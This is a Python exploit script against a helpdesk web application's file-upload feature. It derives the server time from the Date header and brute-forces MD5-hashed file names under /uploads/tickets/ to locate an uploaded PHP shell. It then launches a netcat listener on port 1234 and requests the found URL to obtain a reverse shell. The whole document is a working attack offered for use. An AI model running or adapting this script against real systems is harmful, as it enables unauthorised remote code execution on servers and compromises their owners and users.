import requests
import calendar
import time
import sys
import hashlib
import subprocess

if len(sys.argv) < 3:
    print("Usage: python3 %s http://example.com/helpdesk shell.php" % sys.argv[0])
    sys.exit(1)

target = sys.argv[1]
fileName = sys.argv[2]

proxies = {'http':'127.0.0.1:8080'}

# Get Server Time
response = requests.head(target)

print("[+] This script assumes that final upload directory is: /uploads/tickets/: and the uploaded file is .php")

serverTime = response.headers['Date']
print("[+] Server date:", serverTime)
# Sat, 04 May 2024 12:48:51 GMT

timeFormat = "%a, %d %b %Y %H:%M:%S %Z"

convertedTime = int(calendar.timegm(time.strptime(serverTime, timeFormat)))

print("[+] Converted time:", convertedTime)

print("[+] Searching file...")

for x in range(0,90):

    probablyFileName = fileName + str(convertedTime - x)

    # print(probablyFileName)

    md5FileName = hashlib.md5(probablyFileName.encode()).hexdigest()

    url = target + '/uploads/tickets/' + md5FileName + '.php'

    request = requests.head(url, proxies=proxies)

    if request.status_code == 200:
        print("[+] URL Found:", url)
        
        print("[+] Getting reverse shell")
        subprocess.Popen(["nc","-nvlp","1234"])
        time.sleep(1)

        # Shell request
        requests.head(url, proxies=proxies)

print("[!] Sorry, couldn't find anything.")

